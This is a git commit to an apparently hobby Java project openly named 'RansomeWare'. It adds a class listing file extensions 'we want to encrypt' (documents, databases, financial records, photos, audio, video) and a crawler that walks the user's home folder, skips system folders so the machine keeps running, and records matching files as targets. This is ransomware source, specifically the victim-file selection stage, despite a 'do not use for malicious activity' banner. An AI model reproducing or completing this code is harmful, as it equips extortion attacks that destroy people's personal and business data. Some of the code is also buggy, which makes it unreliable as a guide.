fefbfd885e65e042ef3deaeeb9ea644826274d91
Kyra Mozley <kyralmozley@outlook.com>
2019-07-20 13:24:25 +0100

    Defined filetypes we want to encrypt

---
+++ src/RansomeWare/FileTypes.java
@@ -0,0 +1,130 @@
+package RansomeWare;
+
+import java.io.File;
+import java.util.ArrayList;
+import java.util.List;
+
+public class FileTypes {
+    public List<String> AllowedTypes = new ArrayList<String>();
+
+    public void addFiles() {
+        //Documents
+        AllowedTypes.add(".ASC");
+        AllowedTypes.add(".CSS");
+        AllowedTypes.add(".CSV");
+        AllowedTypes.add(".DOC");
+        AllowedTypes.add(".DOCM");
+        AllowedTypes.add(".DOCX");
+        AllowedTypes.add(".DOT");
+        AllowedTypes.add(".DOTX");
+        AllowedTypes.add(".GDOC");
+        AllowedTypes.add(".GSLIDES");
+        AllowedTypes.add(".HTML");
+        AllowedTypes.add(".LOG");
+        AllowedTypes.add(".KEY");
+        AllowedTypes.add(".KEYNOTE");
+        AllowedTypes.add(".MCW");
+        AllowedTypes.add(".ODM");
+        AllowedTypes.add(".ODP");
+        AllowedTypes.add(".ODOC");
+        AllowedTypes.add(".ODT");
+        AllowedTypes.add(".OSHEET");
+        AllowedTypes.add(".PAGES");
+        AllowedTypes.add(".PEZ");
+        AllowedTypes.add(".PPS");
+        AllowedTypes.add(".PPT");
+        AllowedTypes.add(".PDF");
+        AllowedTypes.add(".RTF");
+        AllowedTypes.add(".TEX");
+        AllowedTypes.add(".TSV");
+        AllowedTypes.add(".INFO");
+        AllowedTypes.add("TXT");
+        AllowedTypes.add(".XML");
+
+        AllowedTypes.add(".AI");
+        AllowedTypes.add(".INDD");
+        AllowedTypes.add(".PSD");
+        AllowedTypes.add(".PMD");
+        AllowedTypes.add(".PUB");
+        AllowedTypes.add(".XCF");
+
+        AllowedTypes.add(".GSHEET");
+        AllowedTypes.add(".NUMBERS");
+        AllowedTypes.add(".ODS");
+        AllowedTypes.add(".OTS");
+        AllowedTypes.add(".WKS");
+        AllowedTypes.add(".XLK");
+        AllowedTypes.add(".XLS");
+        AllowedTypes.add(".XLSB");
+        AllowedTypes.add(".XLSM");
+        AllowedTypes.add(".XLSM");
+        AllowedTypes.add(".XLSX");
+
+        AllowedTypes.add(".JSON");
+        AllowedTypes.add(".MD");
+        AllowedTypes.add(".BAK");
+        AllowedTypes.add(".Bk");
+        AllowedTypes.add(".BIN");
+        AllowedTypes.add(".DAT");
+
+        //Database
+        AllowedTypes.add(".DB");
+        AllowedTypes.add(".FRM");
+        AllowedTypes.add(".MDA");
+        AllowedTypes.add(".MDB");
+        AllowedTypes.add(".ADP");
+        AllowedTypes.add(".MDF");
+        AllowedTypes.add(".ODB");
+        AllowedTypes.add(".SDF");
+        AllowedTypes.add(".SQL");
+        AllowedTypes.add(".SQLITE");
+
+        //Financial
+        AllowedTypes.add(".MYO");
+        AllowedTypes.add(".MYOB");
+        AllowedTypes.add(".TAX");
+        AllowedTypes.add(".OFX");
+        AllowedTypes.add(".IFX");
+
+        //Graphics
+        AllowedTypes.add(".BMP");
+        AllowedTypes.add(".DIB");
+        AllowedTypes.add(".EXIF");
+        AllowedTypes.add(".GIF");
+        AllowedTypes.add(".JNG");
+        AllowedTypes.add(".JPEG");
+        AllowedTypes.add(".PNG");
+        AllowedTypes.add(".RAW");
+        AllowedTypes.add(".SVG");
+        AllowedTypes.add(".BLEND");
+
+        //Audio
+        AllowedTypes.add(".WAV");
+        AllowedTypes.add(".WMA");
+        AllowedTypes.add(".MP3");
+        AllowedTypes.add(".MPEG");
+        AllowedTypes.add(".LOGIC");
+        AllowedTypes.add(".AUP");
+        AllowedTypes.add(".BAND");
+        AllowedTypes.add(".CEL");
+
+        //Video
+        AllowedTypes.add(".AVI");
+        AllowedTypes.add(".M4V");
+        AllowedTypes.add(".MOV");
+        AllowedTypes.add(".MPG");
+        AllowedTypes.add(".FCP");
+        AllowedTypes.add(".IMOVIEPROJ");
+
+
+
+
+    }
+
+    public static void main(String[] args) {
+        FileTypes ft = new FileTypes();
+        ft.addFiles();
+    }
+
+
+}
--- src/RansomeWare/FindFiles.java
+++ src/RansomeWare/FindFiles.java
@@ -19,20 +19,36 @@ DO NOT USE FOR MALICIOUS ACTIVITY
  *********************************************************************/
 package RansomeWare;
 
+import javafx.scene.control.Alert;
+
 import java.io.*;
 import java.text.SimpleDateFormat;
+import java.util.List;
 
 
 public class FindFiles {
     static int count = 0;
     BufferedWriter fileWriter;
 
+    //List of filetypes we want to encrypt
+    FileTypes ft = new FileTypes();
+    List<String> allowedFiles;
+
 
     public void FindFiles() throws Exception {
-        //creating a file to write flies found to
-        Writer writer = new FileWriter("c:\\Windows\\output.txt", false);
+        //Use System Property rather than C:\\ to make it OS independent
+        String home = System.getProperty("user.home");
+
+        //Creating a file to write the files found into
+        Writer writer = new FileWriter(home + File.separator + "output.txt", false);
         fileWriter = new BufferedWriter(writer);
-        traverse("c:\\");
+
+        //List of allowed files
+        ft.addFiles();
+        allowedFiles = ft.AllowedTypes;
+
+        //Traverse the file system
+        traverse(home);
         fileWriter.close();
     }
     public void traverse(String path) throws Exception {
@@ -40,31 +56,34 @@ public class FindFiles {
         File[] list = root.listFiles();
 
         if(list == null) return;
+
         for(File f: list) {
             if (f.isDirectory()) {
-                String
-                if (f.getName().equals("Windows")) return; //want system to still work
+                if (f.getName().equals("Windows") || f.getName().equals("Library")) return; //want system to still work
                 traverse(f.getAbsolutePath());
                 System.out.println("Dir:" + f.getAbsoluteFile());
             } else {
-                SimpleDateFormat lastModified = new SimpleDateFormat("dd/MM/yyyy");
-                System.out.println("File:" + f.getAbsoluteFile() + " Last Modified:" + f.lastModified());
-                count++;
-                fileWriter.write(f.getAbsolutePath());
-                fileWriter.newLine();
+                String[] fileAndExtension = f.getName().split("\\.");
+                if(fileAndExtension.length == 1) return;
+
+                //if file extension is allowed, write to file
+                if(allowedFiles.contains("." + fileAndExtension[1].toUpperCase())) {
+                    System.out.println("File:" + f.getAbsoluteFile());
+                    count++;
+                    fileWriter.write(f.getAbsolutePath());
+                    fileWriter.newLine();
+                }
             }
         }
     }
 
-    /**
-     *
-     * @param args
-     */
     public static void main(String[] args) throws Exception {
         FindFiles ff = new FindFiles();
+
         long startTime = System.nanoTime();
         ff.FindFiles();
         long endTime = System.nanoTime();
+
         System.out.println("Time: " + (endTime - startTime));
         System.out.println(count);
     }
